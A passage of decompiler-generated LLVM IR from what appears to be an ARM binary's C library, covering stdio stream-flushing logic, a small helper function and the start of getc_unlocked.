  store i32 %v0_17c84, i32* %r0.global-to-local, align 4
  %v0_17c88 = load i32, i32* %r1.global-to-local, align 4
  %v1_17c88 = add i32 %v0_17c88, 129
  store i32 %v1_17c88, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17c9cthread-pre-split

dec_label_pc_17c9cthread-pre-split:               ; preds = %dec_label_pc_17c7c, %dec_label_pc_17c84
  %v0_17de8.pr.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_17c9c

dec_label_pc_17c9c:                               ; preds = %dec_label_pc_17c9cthread-pre-split, %dec_label_pc_17c1c
  %v0_17de8.pr = phi i32 [ %v0_17de8.pr.pr, %dec_label_pc_17c9cthread-pre-split ], [ %v2_17c34, %dec_label_pc_17c1c ]
  store i32 92, i32* %sb.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %fp.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17de818 = icmp eq i32 %v0_17de8.pr, 0
  br i1 %v2_17de818, label %dec_label_pc_17df0, label %dec_label_pc_17cac

dec_label_pc_17cac:                               ; preds = %dec_label_pc_17c9c, %dec_label_pc_17de4
  %v0_17cd4 = phi i32 [ %v3_17de4, %dec_label_pc_17de4 ], [ %v0_17de8.pr, %dec_label_pc_17c9c ]
  %v1_17cac = inttoptr i32 %v0_17cd4 to i16*
  %v2_17cac = load i16, i16* %v1_17cac, align 2
  %v3_17cac = zext i16 %v2_17cac to i32
  store i32 %v3_17cac, i32* %r3.global-to-local, align 4
  %v1_17cb0 = and i32 %v3_17cac, 64
  %v2_17cb0 = icmp eq i32 %v1_17cb0, 0
  br i1 %v2_17cb0, label %dec_label_pc_17de4, label %dec_label_pc_17cb8

dec_label_pc_17cb8:                               ; preds = %dec_label_pc_17cac
  %v0_17cb8 = load i32, i32* @r6, align 4
  %v1_17cb8 = load i32, i32* %sb.global-to-local, align 4
  %v2_17cb8 = add i32 %v1_17cb8, %v0_17cb8
  %v3_17cb8 = inttoptr i32 %v2_17cb8 to i32*
  %v4_17cb8 = load i32, i32* %v3_17cb8, align 4
  store i32 %v4_17cb8, i32* %r3.global-to-local, align 4
  %v1_17cbc = inttoptr i32 %v4_17cb8 to i32*
  %v2_17cbc = load i32, i32* %v1_17cbc, align 4
  store i32 %v2_17cbc, i32* %r3.global-to-local, align 4
  %v2_17cc0 = icmp ugt i32 %v2_17cbc, 1
  store i1 %v2_17cc0, i1* %cpsr_c.global-to-local, align 1
  %v7_17cc0 = icmp eq i32 %v2_17cbc, 2
  br i1 %v7_17cc0, label %dec_label_pc_17d24, label %dec_label_pc_17cc8

dec_label_pc_17cc8:                               ; preds = %dec_label_pc_17cb8
  %v1_17cc8 = add i32 %v0_17cd4, 64
  %v2_17cc8 = inttoptr i32 %v1_17cc8 to i32*
  %v3_17cc8 = load i32, i32* %v2_17cc8, align 4
  store i32 %v3_17cc8, i32* %r3.global-to-local, align 4
  %v1_17ccc = load i32, i32* %r8.global-to-local, align 4
  %v3_17ccc = icmp uge i32 %v3_17cc8, %v1_17ccc
  store i1 %v3_17ccc, i1* %cpsr_c.global-to-local, align 1
  %v9_17ccc = icmp eq i32 %v3_17cc8, %v1_17ccc
  br i1 %v9_17ccc, label %dec_label_pc_17d18, label %dec_label_pc_17cd4

dec_label_pc_17cd4:                               ; preds = %dec_label_pc_17cc8
  %v1_17cd4 = add i32 %v0_17cd4, 56
  store i32 %v1_17cd4, i32* @r7, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_17cd4, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_17ce486 = inttoptr i32 %v1_17cd4 to i32*
  %v2_17ce487 = load i32, i32* %v1_17ce486, align 4
  store i32 %v2_17ce487, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_17ce894 = icmp eq i32 %v2_17ce487, 0
  br i1 %v9_17ce894, label %dec_label_pc_17cf0, label %dec_label_pc_17d08

dec_label_pc_17cf0:                               ; preds = %dec_label_pc_17cd4, %dec_label_pc_17cf0.dec_label_pc_17ce4_crit_edge
  %v0_17cf095 = phi i32 [ %v1_17ce8.pre, %dec_label_pc_17cf0.dec_label_pc_17ce4_crit_edge ], [ 0, %dec_label_pc_17cd4 ]
  store i32 %v0_17cf095, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17d00 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17d00, label %dec_label_pc_17d04, label %dec_label_pc_17cf0.dec_label_pc_17ce4_crit_edge

dec_label_pc_17cf0.dec_label_pc_17ce4_crit_edge:  ; preds = %dec_label_pc_17cf0
  %v0_17ce4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17ce8.pre = load i32, i32* @r4, align 4
  %v1_17ce4 = inttoptr i32 %v0_17ce4.pre to i32*
  %v2_17ce4 = load i32, i32* %v1_17ce4, align 4
  store i32 %v2_17ce4, i32* %r3.global-to-local, align 4
  %v3_17ce8 = icmp uge i32 %v2_17ce4, %v1_17ce8.pre
  store i1 %v3_17ce8, i1* %cpsr_c.global-to-local, align 1
  %v9_17ce8 = icmp eq i32 %v2_17ce4, %v1_17ce8.pre
  br i1 %v9_17ce8, label %dec_label_pc_17cf0, label %dec_label_pc_17d08

dec_label_pc_17d04:                               ; preds = %dec_label_pc_17cf0
  %v0_17d04 = load i32, i32* @r4, align 4
  store i32 %v0_17d04, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17d08

dec_label_pc_17d08:                               ; preds = %dec_label_pc_17cd4, %dec_label_pc_17cf0.dec_label_pc_17ce4_crit_edge, %dec_label_pc_17d04
  %v0_17d08 = phi i32 [ %v0_17d04, %dec_label_pc_17d04 ], [ %v2_17ce487, %dec_label_pc_17cd4 ], [ %v2_17ce4, %dec_label_pc_17cf0.dec_label_pc_17ce4_crit_edge ]
  %v1_17d08 = phi i32 [ %v0_17d04, %dec_label_pc_17d04 ], [ 0, %dec_label_pc_17cd4 ], [ %v1_17ce8.pre, %dec_label_pc_17cf0.dec_label_pc_17ce4_crit_edge ]
  %v3_17d08 = icmp uge i32 %v0_17d08, %v1_17d08
  store i1 %v3_17d08, i1* %cpsr_c.global-to-local, align 1
  %v9_17d08 = icmp eq i32 %v0_17d08, %v1_17d08
  br i1 %v9_17d08, label %bb70, label %bb69

bb69:                                             ; preds = %dec_label_pc_17d08
  %v1_17d0c = load i32, i32* @r7, align 4
  store i32 %v1_17d0c, i32* %r0.global-to-local, align 4
  br label %bb70

bb70:                                             ; preds = %dec_label_pc_17d08, %bb69
  %v1_17d10 = xor i1 %v9_17d08, true
  call void @__pseudo_cond_branch(i1 %v1_17d10, i32 ptrtoint (i32* @global_var_15400.643 to i32))
  %v0_17d14 = load i32, i32* %r8.global-to-local, align 4
  %v1_17d14 = load i32, i32* @r5, align 4
  %v2_17d14 = add i32 %v1_17d14, 64
  %v3_17d14 = inttoptr i32 %v2_17d14 to i32*
  store i32 %v0_17d14, i32* %v3_17d14, align 4
  %v0_17d18.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17d18

dec_label_pc_17d18:                               ; preds = %dec_label_pc_17cc8, %bb70
  %v0_17d18 = phi i32 [ %v0_17cd4, %dec_label_pc_17cc8 ], [ %v0_17d18.pre, %bb70 ]
  %v1_17d18 = add i32 %v0_17d18, 60
  %v2_17d18 = inttoptr i32 %v1_17d18 to i32*
  %v3_17d18 = load i32, i32* %v2_17d18, align 4
  %v1_17d1c = add i32 %v3_17d18, 1
  store i32 %v1_17d1c, i32* %r3.global-to-local, align 4
  store i32 %v1_17d1c, i32* %v2_17d18, align 4
  %v0_17d24.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17d24

dec_label_pc_17d24:                               ; preds = %dec_label_pc_17cb8, %dec_label_pc_17d18
  %v0_17d3c = phi i32 [ %v0_17cd4, %dec_label_pc_17cb8 ], [ %v0_17d24.pre, %dec_label_pc_17d18 ]
  %v1_17d24 = inttoptr i32 %v0_17d3c to i16*
  %v2_17d24 = load i16, i16* %v1_17d24, align 2
  %v3_17d24 = zext i16 %v2_17d24 to i32
  store i32 %stack_var_-44.1, i32* %r2.global-to-local, align 4
  %v2_17d2c = or i32 %v3_17d24, %stack_var_-44.1
  %v1_17d30 = xor i32 %v2_17d2c, 320
  store i32 %v1_17d30, i32* %r3.global-to-local, align 4
  %v1_17d34 = and i32 %v1_17d30, 832
  %v2_17d34 = icmp eq i32 %v1_17d34, 0
  br i1 %v2_17d34, label %dec_label_pc_17d3c, label %bb71

dec_label_pc_17d3c:                               ; preds = %dec_label_pc_17d24
  store i32 %v0_17d3c, i32* %r0.global-to-local, align 4
  %v1_17d40 = call i32 @__stdio_wcommit(i32 %v0_17d3c)
  store i32 %v1_17d40, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17d44 = icmp eq i32 %v1_17d40, 0
  br i1 %v2_17d44, label %.thread6, label %.thread7

.thread6:                                         ; preds = %dec_label_pc_17d3c
  %v1_17d48 = load i32, i32* @r5, align 4
  %v2_17d48 = inttoptr i32 %v1_17d48 to i16*
  %v3_17d48 = load i16, i16* %v2_17d48, align 2
  %v4_17d48 = zext i16 %v3_17d48 to i32
  store i32 %v4_17d48, i32* %r3.global-to-local, align 4
  %v2_17d4c = add i32 %v1_17d48, 8
  %v3_17d4c = inttoptr i32 %v2_17d4c to i32*
  %v4_17d4c = load i32, i32* %v3_17d4c, align 4
  store i32 %v4_17d4c, i32* %r2.global-to-local, align 4
  %v2_17d50 = and i32 %v4_17d48, 65471
  store i32 %v2_17d50, i32* %r3.global-to-local, align 4
  %v3_17d54 = add i32 %v1_17d48, 28
  %v4_17d54 = inttoptr i32 %v3_17d54 to i32*
  store i32 %v4_17d4c, i32* %v4_17d54, align 4
  %v1_17d58 = load i32, i32* %r3.global-to-local, align 4
  %v2_17d58 = trunc i32 %v1_17d58 to i16
  %v3_17d58 = load i32, i32* @r5, align 4
  %v4_17d58 = inttoptr i32 %v3_17d58 to i16*
  store i16 %v2_17d58, i16* %v4_17d58, align 2
  br label %bb71

.thread7:                                         ; preds = %dec_label_pc_17d3c
  %v1_17d5c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v1_17d5c, i32* %sl.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %.thread6, %dec_label_pc_17d24, %.thread7
  %v0_17d60 = load i32, i32* @r6, align 4
  %v1_17d60 = load i32, i32* %sb.global-to-local, align 4
  %v2_17d60 = add i32 %v1_17d60, %v0_17d60
  %v3_17d60 = inttoptr i32 %v2_17d60 to i32*
  %v4_17d60 = load i32, i32* %v3_17d60, align 4
  store i32 %v4_17d60, i32* %r3.global-to-local, align 4
  %v1_17d64 = inttoptr i32 %v4_17d60 to i32*
  %v2_17d64 = load i32, i32* %v1_17d64, align 4
  store i32 %v2_17d64, i32* %r3.global-to-local, align 4
  %v2_17d68 = icmp ugt i32 %v2_17d64, 1
  store i1 %v2_17d68, i1* %cpsr_c.global-to-local, align 1
  %v7_17d68 = icmp eq i32 %v2_17d64, 2
  br i1 %v7_17d68, label %dec_label_pc_17de4, label %dec_label_pc_17d70

dec_label_pc_17d70:                               ; preds = %bb71
  %v0_17d70 = load i32, i32* @r5, align 4
  %v1_17d70 = add i32 %v0_17d70, 60
  %v2_17d70 = inttoptr i32 %v1_17d70 to i32*
  %v3_17d70 = load i32, i32* %v2_17d70, align 4
  %v1_17d74 = add i32 %v3_17d70, -1
  store i32 %v1_17d74, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17d78 = icmp eq i32 %v1_17d74, 0
  store i32 %v1_17d74, i32* %v2_17d70, align 4
  br i1 %v2_17d78, label %dec_label_pc_17d84, label %dec_label_pc_17de4

dec_label_pc_17d84:                               ; preds = %dec_label_pc_17d70
  %v0_17d84 = load i32, i32* %r3.global-to-local, align 4
  %v1_17d84 = load i32, i32* @r5, align 4
  %v2_17d84 = add i32 %v1_17d84, 64
  %v3_17d84 = inttoptr i32 %v2_17d84 to i32*
  store i32 %v0_17d84, i32* %v3_17d84, align 4
  %v0_17d88 = load i32, i32* @r5, align 4
  %v1_17d88 = add i32 %v0_17d88, 56
  store i32 %v1_17d88, i32* @r7, align 4
  br label %dec_label_pc_17d8c

dec_label_pc_17d8c:                               ; preds = %dec_label_pc_17dbc.dec_label_pc_17d8c_crit_edge, %dec_label_pc_17d84
  %v0_17d94 = phi i32 [ %v0_17d94.pre, %dec_label_pc_17dbc.dec_label_pc_17d8c_crit_edge ], [ %v1_17d88, %dec_label_pc_17d84 ]
  %v0_17d8c = phi i32 [ %v0_17d8c.pre, %dec_label_pc_17dbc.dec_label_pc_17d8c_crit_edge ], [ %v0_17d88, %dec_label_pc_17d84 ]
  %v1_17d8c = add i32 %v0_17d8c, 56
  %v2_17d8c = inttoptr i32 %v1_17d8c to i32*
  %v3_17d8c = load i32, i32* %v2_17d8c, align 4
  store i32 %v3_17d8c, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_17d94, i32* %r2.global-to-local, align 4
  %v1_17d9897 = inttoptr i32 %v0_17d94 to i32*
  %v2_17d9898 = load i32, i32* %v1_17d9897, align 4
  store i32 %v2_17d9898, i32* %r3.global-to-local, align 4
  %v3_17d9c100 = icmp uge i32 %v2_17d9898, %v3_17d8c
  store i1 %v3_17d9c100, i1* %cpsr_c.global-to-local, align 1
  %v9_17d9c106 = icmp eq i32 %v2_17d9898, %v3_17d8c
  br i1 %v9_17d9c106, label %dec_label_pc_17da4, label %dec_label_pc_17dbc

dec_label_pc_17da4:                               ; preds = %dec_label_pc_17d8c, %dec_label_pc_17da4.dec_label_pc_17d98_crit_edge
  %v0_17da4107 = phi i32 [ %v1_17d9c.pre, %dec_label_pc_17da4.dec_label_pc_17d98_crit_edge ], [ %v3_17d8c, %dec_label_pc_17d8c ]
  store i32 %v0_17da4107, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17db4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17db4, label %dec_label_pc_17db8, label %dec_label_pc_17da4.dec_label_pc_17d98_crit_edge

dec_label_pc_17da4.dec_label_pc_17d98_crit_edge:  ; preds = %dec_label_pc_17da4
  %v0_17d98.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17d9c.pre = load i32, i32* @r4, align 4
  %v1_17d98 = inttoptr i32 %v0_17d98.pre to i32*
  %v2_17d98 = load i32, i32* %v1_17d98, align 4
  store i32 %v2_17d98, i32* %r3.global-to-local, align 4
  %v3_17d9c = icmp uge i32 %v2_17d98, %v1_17d9c.pre
  store i1 %v3_17d9c, i1* %cpsr_c.global-to-local, align 1
  %v9_17d9c = icmp eq i32 %v2_17d98, %v1_17d9c.pre
  br i1 %v9_17d9c, label %dec_label_pc_17da4, label %dec_label_pc_17dbc

dec_label_pc_17db8:                               ; preds = %dec_label_pc_17da4
  %v0_17db8 = load i32, i32* @r4, align 4
  store i32 %v0_17db8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17dbc

dec_label_pc_17dbc:                               ; preds = %dec_label_pc_17d8c, %dec_label_pc_17da4.dec_label_pc_17d98_crit_edge, %dec_label_pc_17db8
  %v0_17dc4 = phi i32 [ %v0_17db8, %dec_label_pc_17db8 ], [ %v2_17d9898, %dec_label_pc_17d8c ], [ %v2_17d98, %dec_label_pc_17da4.dec_label_pc_17d98_crit_edge ]
  %v1_17dbc = phi i32 [ %v0_17db8, %dec_label_pc_17db8 ], [ %v3_17d8c, %dec_label_pc_17d8c ], [ %v1_17d9c.pre, %dec_label_pc_17da4.dec_label_pc_17d98_crit_edge ]
  %v3_17dbc = icmp uge i32 %v0_17dc4, %v1_17dbc
  store i1 %v3_17dbc, i1* %cpsr_c.global-to-local, align 1
  %v9_17dbc = icmp eq i32 %v0_17dc4, %v1_17dbc
  br i1 %v9_17dbc, label %dec_label_pc_17dc4, label %dec_label_pc_17dbc.dec_label_pc_17d8c_crit_edge

dec_label_pc_17dbc.dec_label_pc_17d8c_crit_edge:  ; preds = %dec_label_pc_17dbc
  %v0_17d8c.pre = load i32, i32* @r5, align 4
  %v0_17d94.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_17d8c

dec_label_pc_17dc4:                               ; preds = %dec_label_pc_17dbc
  %v2_17dc4 = icmp ne i32 %v1_17dbc, 0
  store i1 %v2_17dc4, i1* %cpsr_c.global-to-local, align 1
  %v7_17dc8 = icmp slt i32 %v1_17dbc, 2
  br i1 %v7_17dc8, label %dec_label_pc_17de4, label %dec_label_pc_17dcc

dec_label_pc_17dcc:                               ; preds = %dec_label_pc_17dc4
  %v0_17dcc = load i32, i32* @r5, align 4
  %v1_17dcc = add i32 %v0_17dcc, 56
  store i32 %v1_17dcc, i32* %r0.global-to-local, align 4
  %v0_17dd0 = load i32, i32* %r1.global-to-local, align 4
  %v1_17dd0 = add i32 %v0_17dd0, 129
  store i32 %v1_17dd0, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17de4

dec_label_pc_17de4:                               ; preds = %dec_label_pc_17d70, %dec_label_pc_17dcc, %dec_label_pc_17dc4, %bb71, %dec_label_pc_17cac
  %v0_17de4 = load i32, i32* @r5, align 4
  %v1_17de4 = add i32 %v0_17de4, 32
  %v2_17de4 = inttoptr i32 %v1_17de4 to i32*
  %v3_17de4 = load i32, i32* %v2_17de4, align 4
  store i32 %v3_17de4, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17de8 = icmp eq i32 %v3_17de4, 0
  br i1 %v2_17de8, label %dec_label_pc_17df0, label %dec_label_pc_17cac

dec_label_pc_17df0:                               ; preds = %dec_label_pc_17de4, %dec_label_pc_17c9c
  %v0_17df0 = call i32 @_stdio_openlist_dec_use()
  store i32 %v0_17df0, i32* %r0.global-to-local, align 4
  %v0_17e2c.pre = load i32, i32* %sl.global-to-local, align 4
  br label %bb73

dec_label_pc_17df8:                               ; preds = %dec_label_pc_17ad4
  %v3_17df8 = load i16, i16* %arg1, align 2
  %v4_17df8 = zext i16 %v3_17df8 to i32
  %v1_17dfc = and i32 %v4_17df8, 64
  store i32 %v1_17dfc, i32* %r3.global-to-local, align 4
  %v2_17dfc = icmp eq i32 %v1_17dfc, 0
  br i1 %v2_17dfc, label %bb72, label %dec_label_pc_17e08

bb72:                                             ; preds = %dec_label_pc_17df8
  store i32 0, i32* %sl.global-to-local, align 4
  br label %bb73

dec_label_pc_17e08:                               ; preds = %dec_label_pc_17df8
  %v2_17e08 = call i32 @__stdio_wcommit(i32 %tmp)
  store i32 %v2_17e08, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17e0c = icmp eq i32 %v2_17e08, 0
  br i1 %v2_17e0c, label %.thread14, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_17e08
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %bb73

.thread14:                                        ; preds = %dec_label_pc_17e08
  %v1_17e10 = load i32, i32* @r4, align 4
  %v2_17e10 = inttoptr i32 %v1_17e10 to i16*
  %v3_17e10 = load i16, i16* %v2_17e10, align 2
  %v4_17e10 = zext i16 %v3_17e10 to i32
  store i32 %v4_17e10, i32* %r3.global-to-local, align 4
  %v2_17e14 = add i32 %v1_17e10, 8
  %v3_17e14 = inttoptr i32 %v2_17e14 to i32*
  %v4_17e14 = load i32, i32* %v3_17e14, align 4
  store i32 %v4_17e14, i32* %r2.global-to-local, align 4
  %v2_17e18 = and i32 %v4_17e10, 65471
  store i32 %v2_17e18, i32* %r3.global-to-local, align 4
  %v2_17e1c = trunc i32 %v2_17e18 to i16
  store i16 %v2_17e1c, i16* %v2_17e10, align 2
  %v1_17e20 = load i32, i32* %r2.global-to-local, align 4
  %v2_17e20 = load i32, i32* @r4, align 4
  %v3_17e20 = add i32 %v2_17e20, 28
  %v4_17e20 = inttoptr i32 %v3_17e20 to i32*
  store i32 %v1_17e20, i32* %v4_17e20, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  br label %bb73

bb73:                                             ; preds = %bb72, %.thread16, %dec_label_pc_17df0, %.thread14
  %v0_17e2c = phi i32 [ -1, %.thread16 ], [ 0, %bb72 ], [ %v0_17e2c.pre, %dec_label_pc_17df0 ], [ 0, %.thread14 ]
  store i32 %v0_17e2c, i32* %r0.global-to-local, align 4
  store i32 %v6_17aa8, i32* %r5.global-to-local, align 4
  ret i32 %v0_17e2c

; uselistorder directives
  uselistorder i32 %v0_17e2c, { 1, 0 }
  uselistorder i32 %v3_17de4, { 1, 2, 0 }
  uselistorder i32 %v0_17db8, { 1, 0, 2 }
  uselistorder i32 %v1_17d9c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_17d3c, { 1, 0, 2 }
  uselistorder i32 %v0_17d04, { 1, 0, 2 }
  uselistorder i32 %v1_17ce8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_17ccc, { 1, 0 }
  uselistorder i32 %v0_17c70, { 1, 0, 2 }
  uselistorder i32 %v1_17c54.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_17c44, { 1, 0 }
  uselistorder i32 %v0_17c08, { 1, 0, 2 }
  uselistorder i32 %v1_17bec.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_17bd4, { 1, 0 }
  uselistorder i32 %v0_17b9c, { 1, 0, 2 }
  uselistorder i32 %v1_17b80.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_17b70, { 1, 0 }
  uselistorder i32 %v0_17b2c, { 1, 0, 2 }
  uselistorder i32 %v1_17b10.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_17ae8, { 2, 1, 0, 3 }
  uselistorder i32 %tmp, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %sl.global-to-local, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 51, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17, 50, 19, 20, 21, 22, 23, 24, 26, 25, 52, 27, 28, 29, 30, 32, 31, 53, 33, 34, 35, 36, 38, 37, 54, 39, 40, 41, 42, 44, 43, 55, 45, 46, 49, 47, 48 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 5, 3, 4, 22, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 0 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 11, 1, 2, 3, 31, 32, 4, 5, 6, 7, 8, 29, 30, 9, 10, 28, 12, 13, 14, 33, 34, 15, 16, 17, 35, 36, 18, 19, 20, 21, 37, 38, 22, 23, 24, 39, 40, 25, 26, 27 }
  uselistorder i32 92, { 0, 1, 2, 5, 3, 4, 6 }
  uselistorder i32 152, { 1, 3, 2, 4, 5, 8, 6, 9, 7, 10, 0, 11, 12, 14, 13, 15, 18, 16, 19, 17, 20 }
  uselistorder i32 129, { 7, 8, 9, 5, 6, 10, 11, 0, 1, 2, 3, 4, 12, 13 }
  uselistorder i32 -61504, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 34, 35, 36, 32, 33 }
  uselistorder i32 -61441, { 16, 17, 18, 19, 20, 21, 12, 13, 14, 15, 22, 23, 24, 25, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 31, 26, 27, 28, 29, 30 }
  uselistorder label %bb73, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_17de4, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_17dbc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17da4, { 1, 0 }
  uselistorder label %bb71, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17d24, { 1, 0 }
  uselistorder label %dec_label_pc_17d18, { 1, 0 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %dec_label_pc_17d08, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17cf0, { 1, 0 }
  uselistorder label %dec_label_pc_17cac, { 1, 0 }
  uselistorder label %dec_label_pc_17c9cthread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_17c74, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17c5c, { 1, 0 }
  uselistorder label %dec_label_pc_17c1c, { 1, 0 }
  uselistorder label %bb68, { 1, 0 }
  uselistorder label %dec_label_pc_17c0c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17bf4, { 1, 0 }
  uselistorder label %dec_label_pc_17bc8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_17ba0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17b88, { 1, 0 }
  uselistorder label %dec_label_pc_17b40, { 1, 0 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %dec_label_pc_17b30, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17b18, { 1, 0 }
  uselistorder label %dec_label_pc_17ae4, { 1, 0 }
}

define i32 @function_17e40(i32 %arg1) local_unnamed_addr {
dec_label_pc_17e40:
  %v0_17e40 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17e40, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_17e40
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_17e40, %bb
  %v10_17e50 = phi i32 [ %arg1, %dec_label_pc_17e40 ], [ 0, %bb ]
  ret i32 %v10_17e50

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @getc_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-17 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_17e54 = load i32, i32* @r4, align 4
  store i32 %v3_17e54, i32* %stack_var_-12, align 4
  %v6_17e54 = load i32, i32* @r5, align 4
  %v9_17e54 = load i32, i32* @lr, align 4
  %v0_17e58 = load i32, i32* @r0, align 4
  %v1_17e58 = add i32 %v0_17e58, 16
  %v2_17e58 = inttoptr i32 %v1_17e58 to i32*
  %v3_17e58 = load i32, i32* %v2_17e58, align 4
  store i32 %v3_17e58, i32* %r2.global-to-local, align 4
  %v1_17e5c = add i32 %v0_17e58, 24
  %v2_17e5c = inttoptr i32 %v1_17e5c to i32*
  %v3_17e5c = load i32, i32* %v2_17e5c, align 4
  %v3_17e60 = icmp ult i32 %v3_17e58, %v3_17e5c
  store i32 %v0_17e58, i32* @r4, align 4
  br i1 %v3_17e60, label %bb, label %dec_label_pc_17e80

bb:                                               ; preds = %entry
  %v2_17e6c = inttoptr i32 %v3_17e58 to i8*
  %v3_17e6c = load i8, i8* %v2_17e6c, align 1
  %v4_17e6c = zext i8 %v3_17e6c to i32
  store i32 %v4_17e6c, i32* %r0.global-to-local, align 4
  %v6_17e6c = add i32 %v3_17e58, 1
  store i32 %v6_17e6c, i32* %r2.global-to-local, align 4
  store i32 %v6_17e6c, i32* %v2_17e58, align 4
  br label %dec_label_pc_17f6c

dec_label_pc_17e80:                               ; preds = %entry
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* @r5, align 4
  %v1_17e80 = inttoptr i32 %v0_17e58 to i16*
  %v2_17e80 = load i16, i16* %v1_17e80, align 2
  %v3_17e80 = zext i16 %v2_17e80 to i32
  %v1_17e84 = and i32 %v3_17e80, 131
  %tmp25 = icmp ugt i32 %v1_17e84, 128
  br i1 %tmp25, label %dec_label_pc_17ea0, label %dec_label_pc_17e90

dec_label_pc_17e90:                               ; preds = %dec_label_pc_17e80
  store i32 128, i32* @r1, align 4
  %v0_17e94 = call i32 @__stdio_trans2r_o()
  store i32 %v0_17e94, i32* %r0.global-to-local, align 4
  %v2_17e98 = icmp eq i32 %v0_17e94, 0
  br i1 %v2_17e98, label %dec_label_pc_17e90.dec_label_pc_17ea0_crit_edge, label %dec_label_pc_17f68

dec_label_pc_17e90.dec_label_pc_17ea0_crit_edge:  ; preds = %dec_label_pc_17e90
  %v0_17ea0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17ea0

dec_label_pc_17ea0:                               ; preds = %dec_label_pc_17e90.dec_label_pc_17ea0_crit_edge, %dec_label_pc_17e80
  %v2_17ee0 = phi i32 [ %v0_17ea0.pre, %dec_label_pc_17e90.dec_label_pc_17ea0_crit_edge ], [ %v0_17e58, %dec_label_pc_17e80 ]
  %v1_17ea0 = inttoptr i32 %v2_17ee0 to i16*
  %v2_17ea0 = load i16, i16* %v1_17ea0, align 2
  %v3_17ea0 = zext i16 %v2_17ea0 to i32
  store i32 %v3_17ea0, i32* %r2.global-to-local, align 4
  %v1_17ea4 = and i32 %v3_17ea0, 2
  %v2_17ea4 = icmp eq i32 %v1_17ea4, 0
  br i1 %v2_17ea4, label %dec_label_pc_17ed0, label %dec_label_pc_17eac

dec_label_pc_17eac:                               ; preds = %dec_label_pc_17ea0
